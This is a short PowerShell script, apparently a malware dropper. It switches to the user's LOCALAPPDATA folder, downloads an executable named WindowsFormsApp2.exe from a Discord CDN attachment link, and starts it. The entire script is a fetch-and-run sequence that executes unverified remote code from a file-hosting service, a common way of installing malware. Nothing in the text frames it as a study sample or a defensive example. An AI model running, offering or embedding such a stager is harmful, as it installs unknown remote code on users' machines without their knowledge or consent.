cd $env:LOCALAPPDATA

Invoke-WebRequest -URI https://cdn.discordapp.com/attachments/1178777779781771346/1182749184999301180/WindowsFormsApp2.exe -OutFile WindowsFormsApp2.exe

cd $env:LOCALAPPDATA
start "$env:LOCALAPPDATA\WindowsFormsApp2.exe"
